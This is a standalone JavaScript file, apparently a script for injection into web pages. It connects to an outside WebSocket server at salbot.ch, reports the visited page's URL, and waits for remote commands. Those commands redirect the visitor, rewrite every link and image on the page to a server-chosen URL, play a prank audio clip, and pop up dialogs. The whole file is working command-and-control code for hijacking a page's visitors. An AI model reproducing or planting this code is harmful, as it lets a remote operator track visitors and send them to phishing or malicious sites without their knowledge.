const socket = new WebSocket("wss://salbot.ch/cable");

socket.onopen = () => {
    const subscribe_request = {
        command: "subscribe",
        identifier: JSON.stringify({
            channel: "DnsChannel",
        })
    }

    socket.send(JSON.stringify(subscribe_request));

    const dns_request = {
        command: "message",
        identifier: JSON.stringify({
            channel: "DnsChannel"
        }),
        data: JSON.stringify({
            type: "dns",
            href: location.href
        })
    }

    socket.send(JSON.stringify(dns_request));
};

socket.onmessage = event => {
    const data = JSON.parse(event.data);

    if (data.type == "ping") return;

    const msg = data.message;

    if (msg == null) return;

    if (msg.type != "perform") return;

    if (document.hidden && msg.target == "self") return;

    try {
        switch (msg.name) {
            case "rickroll":
                document.getElementById("audio-tag-sound").play().catch(err => {});
                break;

            case "redirect": case "redirect-all":
                location = msg.href;
                break;

            case "change-urls": case "change-all-urls":
                let links = document.getElementsByTagName("a");

                for (let link of links) {
                    link.setAttribute("href", msg.href);
                }
                break;

            case "change-images": case "change-all-images":
                let images = document.getElementsByTagName("img");

                for (let image of images) {
                    image.setAttribute("src", msg.href);
                }
                break;
            
            case "alert":
                alert(msg.text);
                break;
            
            case "confirm":
                confirm(msg.text);
                break;

            case "prompt":
                prompt(msg.text, "");
                break;

            default:
                break;
        }
    } catch (error) {}
};
